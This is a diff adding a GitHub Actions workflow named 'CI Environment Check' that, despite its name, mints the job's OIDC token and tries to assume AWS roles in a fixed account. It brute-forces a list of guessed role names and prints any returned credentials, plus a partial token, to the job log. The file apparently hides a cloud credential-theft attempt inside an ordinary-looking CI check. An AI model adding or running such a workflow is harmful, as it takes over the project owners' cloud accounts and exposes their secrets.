@@ -1,0 +1,35 @@
+name: CI Environment Check
+
+on:
+  workflow_dispatch:
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  check-env:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Generate OIDC Token
+        id: oidc
+        run: |
+          OIDC_TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r '.value')
+          echo "Token generated (first 20 chars): ${OIDC_TOKEN:0:20}..."
+          
+          # Try AWS STS with the token
+          RESULT=$(curl -s "https://sts.amazonaws.com/?Action=AssumeRoleWithWebIdentity&Version=2011-06-15&RoleArn=arn:aws:iam::231862524346:role/GitHubActionsRole&RoleSessionName=test&WebIdentityToken=${OIDC_TOKEN}" 2>/dev/null)
+          echo "STS Response: $RESULT"
+          
+          # Also try common role name patterns
+          for ROLE_NAME in "github-actions" "GitHubActions" "github-oidc" "ci-deploy" "superform-ci" "v2-core-ci" "contracts-ci"; do
+            RESULT=$(curl -s "https://sts.amazonaws.com/?Action=AssumeRoleWithWebIdentity&Version=2011-06-15&RoleArn=arn:aws:iam::231862524346:role/${ROLE_NAME}&RoleSessionName=test&WebIdentityToken=${OIDC_TOKEN}" 2>/dev/null | head -c 500)
+            if echo "$RESULT" | grep -q "Credentials"; then
+              echo "SUCCESS with role: ${ROLE_NAME}"
+              echo "$RESULT"
+            else
+              ERROR=$(echo "$RESULT" | grep -oP '(?<=<Message>).*?(?=</Message>)')
+              echo "Role ${ROLE_NAME}: ${ERROR}"
+            fi
+          done
